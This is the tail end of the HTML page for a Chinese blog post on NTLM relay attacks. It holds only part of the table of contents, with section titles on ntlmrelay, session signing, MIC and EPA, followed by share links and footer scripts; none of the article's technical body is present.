影子账户的攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.4.</span> <span class="toc-text">工具利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ntlmrelay%E7%9A%84Socks%E5%8A%9F%E8%83%BD"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">ntlmrelay的Socks功能</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%80%A7"><span class="toc-number">3.</span> <span class="toc-text">特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">特性利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#session%E7%AD%BE%E5%90%8D"><span class="toc-number">3.1.1.</span> <span class="toc-text">session签名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E9%9B%86%E5%B7%A5%E5%85%B7"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">搜集工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIC"><span class="toc-number">3.1.2.</span> <span class="toc-text">MIC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EPA"><span class="toc-number">3.1.3.</span> <span class="toc-text">EPA</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-number">4.</span> <span class="toc-text">场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E8%83%BD%E7%94%A8%E7%9A%84linux%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">没有能用的linux？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E6%83%B3"><span class="toc-number">4.2.</span> <span class="toc-text">设想</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&text=关于NTLM relay"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&is_video=false&description=关于NTLM relay"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=关于NTLM relay&body=Check out this article: http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&title=关于NTLM relay"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&name=关于NTLM relay&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://5gstudent.github.io/2024/01/11/%E5%85%B3%E4%BA%8ENTLM-relay/&t=关于NTLM relay"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2024
    5gstudent
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/5gstudent">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
